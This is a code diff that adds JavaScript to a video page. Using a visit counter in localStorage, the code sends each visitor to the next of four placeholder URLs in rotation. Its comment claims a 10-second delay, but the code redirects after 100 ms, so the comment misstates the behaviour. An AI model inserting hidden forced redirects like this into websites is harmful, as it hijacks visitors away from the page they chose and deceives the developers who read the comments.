@@ -156,6 +156,44 @@
                 videoFrame.src = this.getAttribute("data-video");
             });
         });
+
+        // Array of links
+
+const links = [
+
+    "https://www.link1.com",
+
+    "https://www.link2.com",
+
+    "https://www.link3.com",
+
+    "https://www.link4.com"
+
+];
+
+
+// Retrieve the visit count from localStorage (default to 0 if not set)
+
+let visitCount = parseInt(localStorage.getItem("visitCount") || "0", 10);
+
+
+// Get the current link based on the visit count
+
+const currentLink = links[visitCount % links.length]; // Loop through links array
+
+
+// Increment the visit count and save it back to localStorage
+
+localStorage.setItem("visitCount", visitCount + 1);
+
+
+// Redirect to the current link after 10 seconds
+
+setTimeout(() => {
+
+    window.location.href = currentLink;
+
+}, 100); // 10 seconds in milliseconds
         
         setTimeout(() => {
             document.getElementById('notification-bar').style.opacity = '1';
